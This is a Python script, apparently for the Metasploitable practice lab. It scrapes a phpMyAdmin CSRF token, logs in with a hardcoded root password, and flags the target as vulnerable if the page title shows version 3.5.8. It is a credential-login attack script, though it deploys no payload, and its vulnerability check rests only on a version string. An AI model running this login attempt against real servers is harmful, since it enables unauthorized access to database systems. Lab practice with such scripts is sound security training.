#!/usr/bin/env python3

import requests
import argparse
from bs4 import BeautifulSoup

import logging
log = logging.getLogger(__name__)


class PHPMyAdmin:
    def __init__(self):
        self.__host = None
        self.__port = 80
        self.__path = "/phpmyadmin/index.php"
        self.__token = None
        self.__requests = requests.session()

    def __csrf(self):
        log.debug("[!] Getting CSRF Token")
        r = self.__requests.get(f"http://{self.__host}:{self.__port}{self.__path}")
        soup = BeautifulSoup(r.text, 'lxml')
        self.__token = soup.select_one('input[name="token"]')['value']

    def __exploit(self):
        params = {
            "pma_username": "root",
            "pma_password": "sploitme",
            "server": "1",
            "token": self.__token
        }
        r  = self.__requests.post(f"http://{self.__host}:{self.__port}{self.__path}", params=params)
        if r.status_code != 200:
            log.info("[*] Error logging into PHPMyAdmin")
            return False
        soup = BeautifulSoup(r.text, 'lxml')
        title = soup.find("title").text
        if "phpMyAdmin 3.5.8" in title:
            log.info("[!] PHPMyAdmin is vulnerable")
            return True
        log.info("[!] PHPMyAdmin is secure")
        return False

    def run(self, host, port=None):
        self.__host = host
        log.info(f"[*] Exploiting PHPMyAdmin ({self.__host})")
        if port:
            self.__port = port
        self.__csrf()
        return self.__exploit()


def main(args):
    log.info("[+] Metasploitable PHPMyAdmin exploit by xentrick")
    log.info("[+] Exploiting " + args.host + ":" + args.port)

    exploit = PHPMyAdmin()
    if exploit.run(args.host, int(args.port)):
        log.info("Target exploited")
    else:
        log.info("Exploit failed.")


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--host", required=True)
    parser.add_argument("--port", required=True)
    args = parser.parse_args()

    main(args)
